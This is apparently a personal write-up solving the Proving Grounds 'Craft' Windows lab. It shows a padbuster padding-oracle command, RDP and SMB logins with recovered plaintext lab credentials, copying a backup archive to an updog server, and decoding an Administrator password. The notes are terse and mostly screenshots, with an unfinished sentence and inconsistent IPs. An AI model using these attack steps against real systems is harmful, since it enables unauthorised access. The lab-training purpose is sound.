---

title: Craft

date: 2026-03-29T12:00:04+01:00

draft: false

tags:

- offsec

- nmap

- windows

- macros

- proving-grounds

- updog

- revshells

- godpotato

categories:

- Pentesting

- Offsec

- Windows

description: "This guide provides readers with the solution to the Proving Grounds Lab: Craft"

---
 Great start...
 
![](Screenshot%202026-04-03%20at%2006.26.46.png)
![](Screenshot%202026-04-03%20at%2006.28.14.png)

![](Screenshot%202026-04-03%20at%2006.36.10.png)

Padding Oracle attack: An attacker decrypts ciphertext without knowing the key by analysing server error messages. 

I'm wiped, heavy math morning
Read this:
https://pentesterlab.com/exercises/padding-oracle

There is another service open on port 2290.

![](Screenshot%202026-04-04%20at%2016.42.42.png)

Its telling us to look at this html tag:

![](Screenshot%202026-04-03%20at%2011.29.44.png)
![](Screenshot%202026-04-04%20at%2016.49.10.png)

If we change the last 2 digits of the string it will give us a "0".

![](Screenshot%202026-04-04%20at%2016.50.59.png)


![](Screenshot%202026-04-03%20at%2011.46.14.png)

This cyphertext has 2 blocks of 16

Padbuster will 
https://www.levelblue.com/blogs/spiderlabs-blog/automated-padding-oracle-attacks-with-padbuster/

`padbuster "http://192.168.182.119:2290/?c=4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488" "4358b2f77165b5130e323f067ab6c8a92312420765204ce350b1fbb826c59488" 16 -encoding 1 -error '<span id="MyLabel">0</span>'`

 Padbuster iterates through all 256 possible hex values for each byte. It treats any response containing <span id="MyLabel">0</span> as a padding error. Once it receives a response without that error string, it knows the padding is valid, confirms the byte, and moves to the next.

![](Screenshot%202026-04-03%20at%2011.28.51.png)
![](Screenshot%202026-04-03%20at%2011.28.22.png)

`enum4linux-ng -A 192.168.128.119  -u "victor -p "WormAloeVat7"`

`nxc rdp 192.168.182.119  -u "victor" -p "WormAloeVat7"`

![](Screenshot%202026-04-04%20at%2017.40.47.png)

`xfreerdp3 /v:192.168.128.119 /u:"victor"  /p:"WormAloeVat7"`

![](Screenshot%202026-04-03%20at%2012.34.04.png)

![](Screenshot%202026-04-03%20at%2012.36.35.png)

![](Screenshot%202026-04-03%20at%2012.37.11.png)

I read the description for the lab, there is a specific rar file to be found. 

`dir C:\*.rar /s /p`

![](Screenshot%202026-04-04%20at%2014.55.06.png)

Upload the .rar file to your updog server. 
`updog -p 80`

![](Screenshot%202026-04-04%20at%2014.27.46.png)

![](Screenshot%202026-04-04%20at%2014.57.50.png)

Install unrar:
`unrar e backup.rar`

You'll be prompted for a password:WormAloeVat7

![](Screenshot%202026-04-04%20at%2015.01.31.png)

`base64 -d backup.txt`

![](Screenshot%202026-04-04%20at%2014.39.35.png)

`xfreerdp3 /v:192.168.182.119 /u:"Administrator" /p:"EverywayLabelWrap375"`                                                                                    
![](Screenshot%202026-04-04%20at%2014.50.07.png)

![](Screenshot%202026-04-04%20at%2014.49.46.png)

